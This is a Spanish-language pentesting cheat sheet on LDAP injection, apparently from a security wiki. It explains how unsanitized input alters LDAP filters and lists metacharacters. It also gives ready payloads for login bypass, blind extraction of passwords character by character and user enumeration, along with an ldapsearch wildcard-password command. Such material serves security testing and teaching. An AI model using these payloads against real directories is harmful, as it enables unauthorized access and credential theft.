---
icon: database
---

# LDAP Injection

LDAP (Lightweight Directory Access Protocol) se usa para consultar directorios como Active Directory. Si el input del usuario se incorpora sin sanitización en una query LDAP, se puede manipular la lógica de autenticación o extraer datos del directorio.

```
Filtro LDAP normal:
(&(uid=USUARIO)(userPassword=CONTRASEÑA))

Con inyección:
(&(uid=admin)(*))(&(userPassword=x))
→ El primer bloque devuelve todos los usuarios con uid=admin (condición * = todo)
→ El segundo bloque se ignora por cierre anticipado
→ Login bypass
```

#### Metacaracteres LDAP

```
*     → wildcard, coincide con cualquier valor
(     → abre paréntesis
)     → cierra paréntesis
\     → escape
NUL   → carácter nulo (\x00)
&     → AND lógico
|     → OR lógico
!     → NOT lógico
```

#### Bypass de autenticación LDAP

```bash
# Si el filtro es: (&(uid=INPUT_USER)(userPassword=INPUT_PASS))

# Payload en username para bypass
*                    # uid=* → cualquier usuario
admin)(&)            # (&(uid=admin)(&))(userPassword=x)) → siempre true
admin)(%00           # null byte para truncar
*)(&(uid=*           # cierre y apertura de filtro
*)(|(uid=*           # OR que siempre es true
admin)(uid=*         # reemplazar condición

# Payload en password (cuando username es conocido)
*                    # cualquier contraseña
*)(&                 # truncar filtro
x)(|(uid=*           # OR bypass
```

#### Extracción de datos (LDAP Blind)

```bash
# Inferir el valor de un atributo carácter a carácter
# Si el filtro es: (&(uid=INPUT)(condicion))
# Y la app devuelve resultado cuando el filtro coincide:

# ¿Empieza el password por 'a'?
*)(userPassword=a*
# ¿Empieza por 'ab'?
*)(userPassword=ab*
# Iterar hasta completar el valor

# Enumerar usuarios
a*)(uid=*      → coincide con usuarios cuyo uid empieza por 'a'
*)(cn=admin*   → buscar usuarios con cn que empiece por admin
```

#### Herramientas

```bash
# LDAP injection manual con ldapsearch
ldapsearch -x -H ldap://target.com -b "dc=empresa,dc=local" \
    -D "uid=admin,ou=users,dc=empresa,dc=local" -w '*'

# Blind LDAP injection con script
for char in {a..z} {0..9}; do
    # Probar si el atributo empieza por $char
    # Medir tiempo o respuesta
done
```
